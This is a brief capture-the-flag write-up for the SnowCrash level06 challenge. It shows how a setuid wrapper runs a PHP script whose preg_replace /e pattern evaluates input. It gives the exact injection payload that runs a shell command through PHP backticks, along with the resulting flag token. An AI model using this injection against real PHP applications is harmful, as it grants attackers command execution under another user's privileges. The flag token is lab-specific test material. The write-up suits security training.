we have 2 files level06.php and level06
level06 is binary file, by analysing it with ghidra
we can see that the script is using the file level06 as a parameter
 to execute the php script level06.php with the permission of the user
 who own the file level06

 level06.php:
 the script is using the function preg_replace with the option /e
this option allow the evaluation of php code in the regular expression

so we can inject a command in this script via the input file
the script search for a string that match the pattern /(\[x (.*)\])/e
so:
echo '[x ${`getflag`}]' > /tmp/payload.txt
the `` operator in php is used to execute shell command

then:
./level06 /tmp/payload.txt

level06@SnowCrash:~$ ./level06 /tmp/payload.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
